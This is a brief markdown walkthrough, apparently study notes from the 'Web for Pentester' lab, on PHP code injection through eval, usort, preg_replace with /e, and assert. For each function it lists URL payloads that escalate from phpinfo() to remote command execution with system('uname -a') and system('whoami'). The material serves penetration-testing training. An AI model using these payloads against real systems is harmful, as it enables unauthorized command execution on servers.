## Code Injection
Code Injection is the general term for attack types which consist of injecting code that is then interpreted/executed by the application. This type of attack exploits poor handling of untrusted data. These types of attacks are usually made possible due to a lack of proper input/output data validation

### Web for Penterster walkthrough
### example 1
` eval() - evaluates a string as PHP code ` <br>
**payload**- " .phpinfo(). "  <br>
**payload**- " . hacker".system('uname -a');#       - change to RCE  & url encode need 


### example 2
` usort() - Sort an array by values using a user-defined comparison function ` <br>
**payload**-example2.php?order=id,system('whoami') <br>
**payload**- example2.php?order=id);}system('whoami');#      - change to RCE  & url encode need 


### example 3
` preg_replace() — Perform a regular expression search and replace `<br>
**payload** - example3.php?new=phpinfo()&pattern=/lamer/e&base=Hello lamer"  <br>
**payload** - example3.php?new=system('uname -a')&pattern=/lamer/e&base=Hello lamer         - change to RCE


### example 4
` assert() - Checks if assertion is FALSE ` <br>
**payload** - example4.php?name=hacker'.phpinfo().' <br>
**payload** - example4.php?name=hacker'.system('uname -a').'



###Noted by [konova](https://www.facebook.com/kon0va)


### Ref : 
- [LOL security](https://www.youtube.com/channel/UCQm58nOLArHOfC5dF9zCxHg)
- [OWASP](https://owasp.org/www-community/attacks/Code_Injection)
- [php.net](https://www.php.net)


